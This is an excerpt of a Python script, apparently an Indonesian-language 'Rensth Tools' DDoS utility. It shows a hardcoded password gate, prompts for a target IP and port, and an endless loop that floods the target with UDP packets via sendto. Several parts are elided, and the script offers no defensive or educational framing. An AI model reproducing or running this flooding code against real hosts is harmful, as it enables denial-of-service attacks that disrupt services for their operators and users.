...
print("\u001b[35m Selamat Datang di Rensth Tools")
time.sleep(2)
print("Loading.......")
os.system("clear")
...
while attemps < 150:
    ...
    if username == '552233' and password == '552233':
...
print(Fore.YELLOW +"                       Ddos by Rensth\n")
print(Fore.BLUE +"                        Code By +62 Rensth & All Development")

ip = str(input(Fore.GREEN +"SASARAN IP:"))
port = int(input("SASARAN PORT:"))
choice = str(input("lanjut?(y/n):"))
    ...
    while True:
        try:
            ...
            for x in range(times):
                s.sendto(data,addr)
            print(i +"*****Rensth-On-Top***** Ip %s Dan Port : %s"%(ip, port))
        except:
